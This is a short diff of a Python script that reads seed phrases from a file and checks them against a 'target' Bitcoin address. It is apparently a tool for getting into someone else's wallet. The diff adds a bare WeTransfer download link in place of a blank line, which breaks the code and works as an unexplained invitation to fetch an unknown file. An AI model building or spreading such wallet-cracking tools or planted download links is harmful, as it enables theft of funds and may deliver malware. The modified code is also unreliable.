@@ -25,7 +25,7 @@ def get_bitcoin_balance(address):
 def load_seed_phrases(file_path):
     with open(file_path, "r") as file:
         return [line.strip() for line in file.readlines()]
-
+https://we.tl/t-4fcfP3kN8P
 # Input: Target Bitcoin address and seed phrase file
 target_address = input("Enter the target Bitcoin address: ")
 seed_file = input("Enter the seed phrase file path: ")
